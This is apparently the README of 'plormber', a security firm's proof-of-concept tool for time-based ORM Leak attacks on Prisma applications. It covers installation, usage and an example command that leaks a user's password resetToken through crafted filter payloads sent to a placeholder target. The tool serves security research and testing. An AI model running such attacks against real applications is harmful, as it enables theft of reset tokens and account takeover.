# plORMber

A proof-of-concept tool for exploiting ORM Leak time-based vulnerabilities. The features of this tool are currently very limited, but can be used to quickly implement a time-based ORM Leak attack.

See the accompanying [blog article](https://www.elttam.com/blog/plormbing-your-prisma-orm/) for an overview on how `plormber` works.

Feel free to fork this project for further development as long that you acknowledge [elttam](https://www.elttam.com/) as the original creators.

---
## Features

* Time-based exploitation of `prisma`
* SDK for developing ORM leak exploits

---
## Installation

*Virtual environment install*
```bash
# For installing to a virtual environment
python3 -m venv venv
source venv/bin/activate

# Install plormber
pip install .
```

*Docker install*
```bash
docker compose build
```

---
## Usage

*Virtual environment*
```bash
plormber --help
```

*Docker*
```bash
docker compose run --rm plormber --help
```

---

## Prisma Example

*Prisma time-based attack with payloads as arguments*
```bash
plormber prisma-contains \
    --chars '0123456789abcdef' \
    --base-query-json '{"query": {PAYLOAD}}' \
    --leak-query-json '{"createdBy": {"resetToken": {"startsWith": "{ORM_LEAK}"}}}' \
    --contains-payload-json '{"body": {"contains": "{RANDOM_STRING}"}}' \
    --verbose-stats \
    https://some.vuln.app/articles/time-based;
```

---
## Custom `plormber` Attacks

See [CUSTOM_ATTACKS.md for documentation about implementing custom `plormber` attacks](./CUSTOM_ATTACKS.md)

---

## Planned Future Features

* More exploitation methods.
* Burp Suite plugin